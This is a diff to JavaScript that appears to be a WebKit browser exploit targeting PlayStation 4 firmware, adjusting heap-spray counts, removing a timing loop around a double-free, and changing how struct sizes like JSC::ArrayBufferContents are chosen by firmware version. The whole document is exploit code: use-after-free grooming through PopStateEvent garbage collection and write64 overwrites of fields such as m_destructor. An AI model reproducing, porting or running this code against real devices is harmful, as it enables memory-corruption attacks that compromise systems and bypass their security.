@@ -95,7 +95,7 @@ const buffer_len = 0x20;
 // JSArrayBufferView we won't hit any unmapped areas
 const num_str = 0x4000;
 const num_gc = 30;
-const num_space = 19;
+const num_space = 15;
 const original_loc = window.location.pathname;
 const loc = original_loc + '#foo';
 
@@ -255,16 +255,6 @@ async function setup_ar(save) {
     // average total sleep time.
     let total_sleep = 0;
     const num_sleep = 8;
-    // Don't sleep for 9.xx. Tests show it is slower. This check and the sleep
-    // before double_free() make setup_ar() fast for 9.xx.
-    while (true && target !== ps4_9_00) {
-        await sleep(num_sleep);
-        total_sleep += num_sleep;
-
-        if (view[0] !== 1) {
-            break;
-        }
-    }
     // debug_log(`total_sleep: ${total_sleep}`);
     // log to check if the garbage collector did collect PopStateEvent
     // must not log "1, 0, 0, 0, ..."
@@ -502,7 +492,7 @@ function setup_ssv_data(reader) {
     // sizeof WTF::Vector<T>
     const size_vector = 0x10;
     // sizeof JSC::ArrayBufferContents
-    const size_abc = target === ps4_9_00 ? 0x18 : 0x20;
+    const size_abc = (window.fw_float >= 3.00) ? 0x18 : 0x20;
 
     // WTF::Vector<unsigned char>
     const m_data = new Uint8Array(size_vector);
@@ -545,7 +535,7 @@ function setup_ssv_data(reader) {
     // PS4 8.03.
     const worker = new Uint8Array(new ArrayBuffer(1));
 
-    if (target !== ps4_9_00) {
+    if (size_abc === 0x20) {
         // m_destructor
         write64(abc, 0, Int.Zero);
         // m_shared
